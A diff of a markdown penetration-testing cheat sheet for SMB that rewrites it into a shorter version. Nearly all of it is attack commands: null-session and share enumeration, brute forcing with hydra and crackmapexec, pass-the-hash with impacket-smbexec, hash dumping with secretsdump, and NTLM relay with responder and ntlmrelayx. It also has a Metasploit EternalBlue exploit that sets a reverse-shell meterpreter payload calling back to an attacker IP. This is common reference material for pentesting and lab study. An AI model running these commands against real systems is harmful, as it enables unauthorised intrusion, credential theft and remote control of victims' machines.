@@ -1,175 +1,98 @@
-```table-of-contents
-```
+# SMB (139, 445)
 
 !!! tip "Start here"
-    First check: `netexec smb <target> -u '' -p ''` (null session). If that fails, try `guest:guest`. Null sessions still work on older or misconfigured Windows hosts and give you share listings and sometimes user enumeration.
+    Check null session first: `netexec smb 10.10.10.10 -u '' -p ''`. If that fails, try `guest:guest`. Null sessions still work on older or misconfigured Windows hosts and give you share listings and sometimes user enumeration.
+
+---
 
 ## Enumeration
-### Check for Availability
-```bash
-nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode,smb2-capabilities $IP
-```
-
-CrackMapExec:
-```bash
-crackmapexec smb $IP
-```
-Provides quick system information, user enumeration, and SMB version detection.
-
-Validate username/password:
-```bash
-crackmapexec smb $IP -u users.txt -p "Password"
-```
-## Listing Shares Anonymously
-```bash
-smbclient -L //$IP --option="client min protocol=core" -U '' 
-```
-## List SMB Shares
-Unsure of login credentials:
-```bash
-smbclient -L //$IP -U guest
-```
-
-* If prompted for a password, try an empty password, `guest`, or `anonymous`
 
 ```bash
-nmap --script smb-enum-shares -p 445 $IP
+nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode 10.10.10.10
+crackmapexec smb 10.10.10.10
+enum4linux-ng -A 10.10.10.10
 ```
 
-Below is a special case use. This will take care of shares with spaces in the name, users on a different domain (for AD), and using a valid username/password:
-```bash
-smbclient -L "//192.168.243.175/My Share" -U "DOMAIN/username%password"
-```
-## Enum4linux
-```bash
-enum4linux -a $IP
-```
-- `-a`: Runs all enumeration options (users, shares, password policies, etc.).
-- `-G`: Grabs group membership from the target.
-- `-o`: Output the results to a file.
-- `-i`: Information about the target system (OS version).
+---
 
-## Enum4linux-ng
-The next-generation version of enum4linux. Provides similar output, however, both should be used in parallel:
+## Share Enumeration
+
 ```bash
-enum4linux-ng -A $IP
-```
-## Null Sessions
-Attempt to connect to any null sessions of specific shares:
-```bash
-smbclient //10.0.0.0/SHARE -N
-```
-## Enumerate SMB Users
-### Using Enum4Linux
-```bash
-enum4linux -U $IP
-```
-## Brute Force SMB Credentials
-CrackMapExec:
-```bash
-crackmapexec smb $IP -u users.txt -p passwords.txt
+smbclient -L //10.10.10.10 -U ''
+smbclient -L //10.10.10.10 -U guest
+nmap --script smb-enum-shares -p 445 10.10.10.10
+crackmapexec smb 10.10.10.10 --shares
 ```
 
-Hydra:
+Connect to a share:
+
 ```bash
-hydra -L users.txt -P passwords.txt smb://$IP -V
+smbclient //10.10.10.10/ShareName -U <user>
 ```
 
-Metasploit:
-```bash
-msfconsole
-use auxiliary/scanner/smb/smb_login
-set RHOSTS $IP
-set USER_FILE users.txt
-set PASS_FILE passwords.txt
-run
-```
+Download files once connected:
 
-## Downloading Content
-Single file:
 ```bash
-smb> get file
-```
-
-Directory:
-```bash
+smb> get filename
 smb> mget *
 ```
 
-## Exploiting Misconfigurations
-### Anonymous Login
-First, check to see if anonymous login is allowed. If any public shares are found, we can use the following to log in:
+---
+
+## Brute Force
+
 ```bash
-smbclient //$IP/SHARE -U guest
+crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt
+hydra -L users.txt -P passwords.txt smb://10.10.10.10
 ```
 
-### EternalBlue (MS17-010)
-Check for vulnerability:
+---
+
+## Pass-the-Hash
+
 ```bash
-nmap -p 445 --script smb-vuln-ms17-010 $IP
+crackmapexec smb 10.10.10.10 -u Administrator -H <ntlm-hash>
+impacket-smbexec EXAMPLE/Administrator@10.10.10.10 -hashes :<ntlm-hash>
 ```
 
-If present, follow instructions below:
-https://github.com/3ndG4me/AutoBlue-MS17-010
+---
 
-Or, if available, use MSF:
+## Credential Dumping
+
+```bash
+secretsdump.py EXAMPLE/<user>@10.10.10.10
+secretsdump.py EXAMPLE/<user>@10.10.10.10 -hashes :<ntlm-hash>
+```
+
+---
+
+## NTLM Relay
+
+Capture and relay NTLMv2 authentication to SMB:
+
+```bash
+responder -I eth0 -rdwv
+ntlmrelayx.py -tf targets.txt -smb2support
+```
+
+---
+
+## EternalBlue (MS17-010)
+
+```bash
+nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10
+```
+
+If vulnerable:
+
 ```bash
 msfconsole
 use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS $IP
+set RHOSTS 10.10.10.10
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST <attacker-ip>
 exploit
 ```
 
-### SMBGhost (CVE-2020-0796)
-Check for vulnerability:
-```bash
-nmap -p 445 --script smb-vuln-cve-2020-0796 $IP
-```
-
-If present, follow instructions below:
-https://github.com/jamf/CVE-2020-0796-RCE-POC
-### Upload a Malicious File
-Assuming we have write access to the SMB, we could obtain a reverse shell by uploading `nc.exe` for example into the share, then start a NC listener on the attacking machine.
-
-## Post-Exploitation & Lateral Movement
-### Pass-the-Hash (Pth)
-If we've gained NTLM credentials, we can try a PtH attack:
-```bash
-crackmapexec smb $IP -u Administrator -H <NTLM-hash>
-```
-
-OR using Impacket's SMBExec:
-```bash
-impacket-smbexec <DOMAIN>/<user>@$IP -hashes :<NTLM-hash>
-```
-### Enumerating SMB Shares & Users
-```bash
-crackmapexec smb $IP --shares
-```
-### RCE via SMB
-If an administrator account is compromised:
-```bash
-crackmapexec smb $IP -u admin -p password --exec "whoami"
-```
-
-### Extracting Password Hashes
-Retrieve NTLM hashes from SMB:
-```bash
-secretsdump.py <domain>/<user>@$IP
-```
-
-## Relay Attack
-Use Responder and Impacket’s ntlmrelayx to relay authentication requests, potentially gaining immediate access to SMB or other services:
-
-Start responder:
-```
-responder -I eth0 -rdwv
-```
-
-SMB Relay Attack (with Impacket):
-```
-ntlmrelayx.py -tf targets.txt -smb2support
-```
-
+!!! tip "Real-world"
+    SMB is usually the first service worth digging into on internal assessments. Start with null/guest sessions, then move to credential spraying. NTLM relay is high-value when you can poison LLMNR — many networks still have LLMNR/NBT-NS enabled and no SMB signing enforced. Check signing with `crackmapexec smb 10.10.10.10 --gen-relay-list relay_targets.txt`.
